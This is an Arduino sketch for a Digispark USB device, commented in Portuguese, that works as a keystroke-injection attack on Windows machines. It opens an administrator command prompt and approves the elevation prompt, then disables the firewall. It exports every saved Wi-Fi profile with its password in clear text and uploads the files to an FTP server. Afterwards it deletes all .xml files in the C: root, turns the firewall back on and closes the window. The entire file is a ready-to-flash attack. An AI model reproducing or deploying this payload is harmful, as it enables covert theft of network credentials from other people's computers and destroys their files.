#include "DigiKeyboard.h"

void setup() {
  pinMode(0, OUTPUT);      //LED no modelo B.
  pinMode(1, OUTPUT);      //LED no modelo A ou Pro.

//Pisca o led 3 vezes alertando o inicio do script.
  digitalWrite(0, HIGH);   // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);              // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);    // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  digitalWrite(0, HIGH);   // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);              // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);    // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  digitalWrite(0, HIGH);   // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);              // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);    // Apaga o LED.
  digitalWrite(1, LOW); 


// Começo do script!
  
 DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1800); 
// executa o CMD como admin +~- 4sec.
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(700);
  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3300);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
//Derruba o firewall interno.
  DigiKeyboard.delay(1700);
  DigiKeyboard.print("netsh firewall set opmode mode=disable");
  DigiKeyboard.delay(36);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
//envia os arquivos .xml com a senha para C: 
  DigiKeyboard.delay(500);
  DigiKeyboard.print("netsh wlan export profile key=clear folder=c:\\");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//posiciona o prompt na Raiz "C:\"
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cd C:\\");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//loga no FTP.
  DigiKeyboard.delay(50);
  DigiKeyboard.print("ftp -i ftp.seudominio.com");  // endereço do FTP.
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(800);
  DigiKeyboard.print("admin");  // Usuario.
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100);
  DigiKeyboard.print("pass");  //Senha.
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  //navega até o diretório onde sera salvo
  DigiKeyboard.delay(900);
  DigiKeyboard.print("cd captura");  //diretório no ftp onde sera salvo os arquivos.. deve existir.
  DigiKeyboard.delay(80);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(100);
  DigiKeyboard.print("cd wifi");  //sub-diretório do diretório acima onde sera salvo os arquivos.. deve existir.
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(133);
  DigiKeyboard.print("prompt");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(220);
  DigiKeyboard.print("prompt");
  DigiKeyboard.delay(60);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
// pega os arquivos .xml com as senhas na raiz do "C:/" e encaminha para o FTP.
  DigiKeyboard.delay(50);
  DigiKeyboard.print("PUT ./*.xml");
  DigiKeyboard.delay(58);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//Finaliza a conexão FTP.
  DigiKeyboard.delay(1270);
  DigiKeyboard.print("bye");
  DigiKeyboard.delay(62);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//Exclui os arquivos .xml na raiz do C: !!exclui todos os .XML da Raiz C:/ , use com cuidado!!
  DigiKeyboard.delay(150);
  DigiKeyboard.print("del *.xml");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//Reabilita o firewall.
  DigiKeyboard.delay(238);
  DigiKeyboard.print("netsh firewall set opmode mode=enable");
  DigiKeyboard.delay(28);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

//Fecha o CMD e conclui o ataque e fecha o prompt de comando.
  DigiKeyboard.delay(182);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(30);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10);

//Pisca o led 3 vezes alertando a conclusão o script.
  digitalWrite(0, HIGH);    // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);               // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);     // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  digitalWrite(0, HIGH);    // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);               // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);     // Apaga o LED.
  digitalWrite(1, LOW); 
  delay(200);
  digitalWrite(0, HIGH);    // Acende o LED.
  digitalWrite(1, HIGH);
  delay(200);               // Tempo de intervalo entre aceso e apagado do led.
  digitalWrite(0, LOW);     // Apaga o LED.
  digitalWrite(1, LOW); 
  
}


void loop() {

}
